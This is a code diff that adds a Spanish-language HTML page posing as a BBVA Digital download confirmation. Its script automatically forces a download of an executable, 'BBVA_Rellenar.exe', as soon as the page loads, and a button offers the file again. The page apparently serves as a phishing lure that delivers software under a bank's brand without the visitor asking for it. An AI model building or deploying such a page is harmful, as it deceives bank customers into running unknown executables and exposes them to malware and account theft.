@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>BBVA Digital – Descarga</title>
+  <style>
+    body{
+      font-family:Arial, sans-serif;
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      justify-content:center;
+      height:100vh;
+      margin:0;
+      background:#f9f9f9;
+      color:#004481;
+    }
+    img{
+      width:120px;
+      height:auto;
+      margin-bottom:20px;
+    }
+    .btn{
+      margin-top:25px;
+      background:#0079BF;
+      color:#fff;
+      padding:10px 24px;
+      border:none;
+      border-radius:4px;
+      cursor:pointer;
+      text-decoration:none;
+    }
+  </style>
+</head>
+<body>
+
+  <img src="tick.png" alt="Descarga correcta">
+
+  <h2>Descarga realizada con éxito</h2>
+  <p>Gracias por su descarga.<br>Puede cerrar esta pestaña.</p>
+
+  <a class="btn" href="BBVA_Rellenar.exe" download>Descargar de nuevo</a>
+
+  <script>
+    window.addEventListener('DOMContentLoaded', () => {
+      const a = document.createElement('a');
+      a.href = 'BBVA_Rellenar.exe';
+      a.download = 'BBVA_Rellenar.exe';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    });
+  </script>
+
+</body>
+</html>
+
